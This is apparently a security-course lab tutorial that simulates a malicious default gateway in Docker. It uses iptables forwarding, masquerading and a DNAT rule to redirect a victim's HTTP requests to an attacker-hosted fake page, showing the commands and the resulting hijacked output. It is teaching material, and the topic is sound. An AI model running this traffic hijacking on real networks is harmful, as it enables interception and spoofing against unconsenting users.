This post describes how to exploit control of the gateway a target uses in order to monitor traffic.
In this scenario, Mallory is the default gateway allowing the target Alice to connect to the external network.

## Setup

***

As we've done previously, we use [docker-compose](https://docs.docker.com/compose/)
to simulate the network.

```yaml
version: '3'

services:
  alice:
    image: # private image
    container_name: alice
    networks:
      internal:
        ipv4_address: 10.0.0.2
    cap_add:
      - NET_ADMIN

  mallory:
      image: # private image
      container_name: mallory
      tty: true
      restart: always
      cap_add:
        - NET_ADMIN
        - SYS_ADMIN
      volumes:
          - .:/shared
      networks:
        internal:
          ipv4_address: 10.0.0.3
        external:
          ipv4_address: 10.0.1.3
  
  wireshark:
    image: # private image
    container_name: wireshark
    tty: true
    network_mode: service:mallory

networks:
  internal:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
  external:
    driver: bridge
    ipam:
       config:
        - subnet: 10.0.1.0/24
```

For the purpose of demonstration, Alice is configured such that Mallory is the default
gateway

```bash
#!/usr/bin/env bash

echo 'nameserver 8.8.8.8' > /etc/resolv.conf
ip route del default
ip route add default via 10.0.0.3
```

and is set to simply send requests to a server repeatedly.

```javascript
const request = require('request');

const url = "http://welcome.seclab.space/";

const TIMEOUT = 5000

var do_request = function(){
    request.get({url: url, timeout: TIMEOUT}, function (err, response, body) {
        if (err) return console.log(err);
        if (response.statusCode != 200) return console.log("[" + response.statusCode + "]");
        console.log("[" + response.statusCode + "] " + body);
    });
};
```

We can start Alice with 
```
$ docker-compose up alice
```

since her gateway (mallory) is not up, Alice times out on her requests

```
alice        | { Error: ETIMEDOUT
alice        |     at Timeout.<anonymous> (/home/nodejs/app/node_modules/request/request.js:848:19)
alice        |     at ontimeout (timers.js:436:11)
alice        |     at tryOnTimeout (timers.js:300:5)
alice        |     at listOnTimeout (timers.js:263:5)
alice        |     at Timer.processTimers (timers.js:223:10) code: 'ETIMEDOUT', connect: true }
```

## Routing the Traffic

***

In a separate terminal, we first set up Mallory to route traffic normally. To run a command under Mallory we use

```
$ docker exec -it mallory bash
```

Commands which start with `#` are run within the container. We now do the following
using [iptables](https://linux.die.net/man/8/iptables):

```
# iptables -F
# iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
# iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT
# iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
```

where the options used are:

- `-F` flushes the selected chain (deletes the rules)
- `-t` specifies the packet matching table to operate on
  - `nat` built-ins are `PREROUTING`, `OUTPUT`, and `POSTROUTING`
- `-A` appends rules to the end of the selected chain
- `-i` name of an interface via a packet is received
- `-o` name of an interface via a packet will be sent
- `-p` the protocol of the rule/packet
- `-m` allows use of modules for example the `state` module to filter based on state
- `-j` "jump" specifies what to do if a packet matches the rule or "target"
  - `ACCEPT` simply let the packet though
  - `DNAT` specifies the packet's destination should be changed to the one
    specified by `--to-destination`
  - `MASQUERADE` allows other connected machines to reach the internet
    even though they may not have an assigned public IP. More info
    can be found [here](https://www.frozentux.net/iptables-tutorial/chunkyhtml/x4422.html)

Alice should now be printing

```
alice        | [200] Welcome to SecLab
```

## Hijacking the Traffic

***

As Mallory, we can create a site and host local server:

```
# cd shared
# echo -n "Welcome to DarkLab" > index.html
# python2.7 -m SimpleHTTPServer 8080
```

Open up another shell for Mallory and hijack the traffic

```
# iptables -t nat -A PREROUTING -p tcp -i eth1 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080
```

Alice is now receiving the manufactured site and we have established a Man-in-the-Middle

```
alice        | [200] Welcome to DarkLab
```

- [iptables](https://linux.die.net/man/8/iptables)

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
